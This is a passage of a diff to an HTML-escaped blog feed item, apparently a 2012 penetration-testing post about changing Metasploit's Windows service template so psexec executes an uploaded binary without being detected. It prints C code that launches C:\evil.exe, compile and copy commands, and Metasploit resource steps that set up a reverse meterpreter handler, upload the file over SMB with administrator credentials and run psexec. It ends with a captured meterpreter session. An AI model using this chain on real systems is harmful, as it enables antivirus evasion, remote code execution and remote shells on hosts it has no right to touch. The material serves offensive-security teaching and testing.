+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;st );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;
 &lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil.exe&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
-{
-	CloseHandle( pi.hProcess );
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;i386-mingw32-gcc -o service.exe service.c 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil.exe&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	CloseHandle( pi.hProcess );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;i386-mingw32-gcc -o service.exe service.c 
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cp service.exe ../../../../template_x86_windows_svc.exe 
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cp service.exe ../../../../template_x86_windows_svc.exe 
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload_file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, &lt;em&gt;remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;
 &lt;p&gt;Start Multi Handler&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;use multi/handler
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use multi/handler
 set PAYLOAD windows/meterpreter/reverse_http
 set LHOST 172.16.195.1
 set LPORT 80
 set ExitOnSession false
 exploit -j -z
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file
 set LPATH evil.exe
 set RPATH evil.exe
 set RHOST 172.16.195.155
@@ -150,7 +149,7 @@ set SMBUser Administrator
 set SMBPass Password1234!
 run
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Execute PSEXEC using the new service binary that simply executes&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;use exploit/windows/smb/psexec
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/windows/smb/psexec
 set RHOST 172.16.195.155
 set SMBUser Administrator
 set SMBPass Password1234!
@@ -161,7 +160,7 @@ set LPORT 80
 exploit -j -z
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;
 &lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; [*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; [*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;w00t!&lt;/p&gt;
 </description>
     </item>
